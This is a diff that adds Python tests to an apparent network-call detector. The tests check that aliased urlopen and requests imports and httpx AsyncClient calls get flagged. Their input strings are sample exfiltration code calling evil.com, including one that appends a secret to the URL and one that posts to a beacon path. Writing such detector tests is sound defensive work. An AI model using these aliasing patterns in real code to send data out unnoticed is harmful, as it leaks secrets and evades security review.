@@ -120,3 +120,50 @@ def test_aliased_requests_detected():
     code = "import requests as req\nreq.get('http://evil.com')\n"
     findings = analyzer.analyze(code, "test.py")
     assert len(findings) >= 1, "Aliased requests.get must be detected"
+
+
+# ── #6: aliased urlopen direct call ──────────────────────────────────────────
+
+def test_aliased_urlopen_detected():
+    """from urllib.request import urlopen as fetch; fetch(url) must be detected."""
+    analyzer = NetworkAnalyzer()
+    code = "from urllib.request import urlopen as fetch\nfetch('http://evil.com/steal')\n"
+    findings = analyzer.analyze(code, "test.py")
+    assert len(findings) >= 1, "Aliased urlopen must be detected"
+    assert any(f.severity in (Severity.HIGH, Severity.CRITICAL) for f in findings)
+
+
+def test_aliased_requests_get_direct_import_detected():
+    """from requests import get as req_get; req_get(url) must be detected."""
+    analyzer = NetworkAnalyzer()
+    code = "from requests import get as req_get\nreq_get('http://evil.com')\n"
+    findings = analyzer.analyze(code, "test.py")
+    assert len(findings) >= 1, "from-import aliased requests.get must be detected"
+
+
+# ── #7: httpx.AsyncClient instance tracking ──────────────────────────────────
+
+def test_httpx_async_client_variable_detected():
+    """c = httpx.AsyncClient(); await c.get(url) must be detected."""
+    analyzer = NetworkAnalyzer()
+    code = (
+        "import httpx\n"
+        "async def exfil(secret):\n"
+        "    c = httpx.AsyncClient()\n"
+        "    await c.get('http://evil.com?data=' + secret)\n"
+    )
+    findings = analyzer.analyze(code, "test.py")
+    assert len(findings) >= 1, "httpx.AsyncClient instance HTTP calls must be detected"
+
+
+def test_httpx_async_with_client_detected():
+    """async with httpx.AsyncClient() as c: await c.post(url) must be detected."""
+    analyzer = NetworkAnalyzer()
+    code = (
+        "import httpx\n"
+        "async def exfil():\n"
+        "    async with httpx.AsyncClient() as c:\n"
+        "        await c.post('http://evil.com/beacon')\n"
+    )
+    findings = analyzer.analyze(code, "test.py")
+    assert len(findings) >= 1, "httpx.AsyncClient context-manager HTTP calls must be detected"
